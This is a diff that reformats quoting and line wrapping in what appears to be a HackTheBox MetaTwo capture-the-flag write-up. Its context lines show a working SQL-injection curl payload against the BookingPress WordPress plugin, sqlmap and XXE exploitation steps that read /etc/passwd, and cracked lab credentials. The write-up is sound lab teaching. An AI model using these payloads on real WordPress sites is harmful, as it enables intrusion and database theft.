@@ -6,8 +6,8 @@ date: 2022-10-30
 image: hackthebox-metatwo-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -53,16 +53,16 @@ Add that in `/etc/hosts` file.
 
 The web page is provided by `WordPress` and Its version is vulnerable, but the `exploit` will only work when we are authenticated.
 
-<FixTheImageURL src='web.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-metatwo-writeup" />
 
 Going over to `/events/` page, it's listed the `information` of events.
 
-<FixTheImageURL src='web1.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-metatwo-writeup" />
 
 Checking the `source code` of that page, we got to know that it's using `booking press 1.0.10`
 Let's check the `exploit` for that specific version
 
-<FixTheImageURL src='web2.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-metatwo-writeup" />
 
 ## CVE-2022-0739
 
@@ -72,10 +72,9 @@ Link : https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 
 For the `exploit` work, we need some info about `_wpnonce` which can be found in `events` page source code
 
-<FixTheImageURL src='web3.png' slug='hackthebox-metatwo-writeup' />
-Now we have two options, is to dump the `database` manually or use some automation
-tool like `sqlmap` I am doing it with `second` option so that `write up` will be
-short
+<FixTheImageURL src="web3.png" slug="hackthebox-metatwo-writeup" />
+Now we have two options, is to dump the `database` manually or use some automation tool like `sqlmap` I am doing it with
+`second` option so that `write up` will be short
 
 For that, we need to `capture` the request into `burp`
 Let's use `-x` flag for passing the `proxy` address
@@ -84,12 +83,11 @@ Let's use `-x` flag for passing the `proxy` address
 ❯ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=06acdaf5ad&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080
 ```
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-metatwo-writeup" />
 Capture the request in `burp` and save it into a file called `admin.req`
-<FixTheImageURL src='burp.png' slug='hackthebox-metatwo-writeup' />
-For `sqlmap` works, we need to remove the `injection` query to any `number`, or you
-can leave that `parameter` empty
-<FixTheImageURL src='cmd1.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="burp.png" slug="hackthebox-metatwo-writeup" />
+For `sqlmap` works, we need to remove the `injection` query to any `number`, or you can leave that `parameter` empty
+<FixTheImageURL src="cmd1.png" slug="hackthebox-metatwo-writeup" />
 That's the final look for the `admin.req` file
 
 ```js
@@ -274,8 +272,8 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 partylikearockstar (?)
 ```
 
--   Creads for manager user - username: manager - password: partylikearockstar
-    Trying that `creads` with ftp but `no luck` this time
+- Creads for manager user - username: manager - password: partylikearockstar
+  Trying that `creads` with ftp but `no luck` this time
 
 ```js
 ❯ ftp ftp://manager:partylikearockstar@10.10.11.186
@@ -290,9 +288,9 @@ ftp: Can't connect or login to host `10.10.11.186:ftp'
 
 Let's try that creads in `wp-admin` panel
 
-<FixTheImageURL src='web4.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-metatwo-writeup" />
 And that's works now we can use the `exploit` for that specific `WordPress` version
-<FixTheImageURL src='web5.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="web5.png" slug="hackthebox-metatwo-writeup" />
 
 ## CVE-2021-29447
 
@@ -322,9 +320,9 @@ Starting the `PHP` server
 
 Now let's `upload` the `payload.wav` file
 
-<FixTheImageURL src='web6.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="web6.png" slug="hackthebox-metatwo-writeup" />
 And we got the `base64` encoded value
-<FixTheImageURL src='cmd2.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="cmd2.png" slug="hackthebox-metatwo-writeup" />
 Finally, got the `/etc/passwd` file
 
 ```js
@@ -473,9 +471,9 @@ if ( ! defined( 'ABSPATH' ) ) {
 require_once ABSPATH . 'wp-settings.php';
 ```
 
--   FTP user creads
-    -   username: metapress.htb
-    -   password: 9NYS_ii@FyL_p5M2NvJ
+- FTP user creads
+  - username: metapress.htb
+  - password: 9NYS_ii@FyL_p5M2NvJ
 
 Successfully login inside the `FTP` server
 
@@ -566,13 +564,13 @@ try {
 }
 ```
 
--   Creads For Jnelson User
-    -   username: jnelson
-    -   password: Cb4_JmWM8zUZWMu@Ys
+- Creads For Jnelson User
+  - username: jnelson
+  - password: Cb4_JmWM8zUZWMu@Ys
 
 And we got the `user.txt` file
 
-<FixTheImageURL src='cmd3.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="cmd3.png" slug="hackthebox-metatwo-writeup" />
 
 ## Privilege Escalation
 
@@ -701,7 +699,7 @@ Convert that into `john` format
 
 And it's `cracked`
 
--   Key: blink182
+- Key: blink182
 
 ```js
 ❯ john -w=/usr/share/wordlists/rockyou.txt gpg.john
@@ -740,4 +738,4 @@ jnelson@meta2:~$ passpie export pass
 
 And we got `root.txt`
 
-<FixTheImageURL src='cmd4.png' slug='hackthebox-metatwo-writeup' />
+<FixTheImageURL src="cmd4.png" slug="hackthebox-metatwo-writeup" />
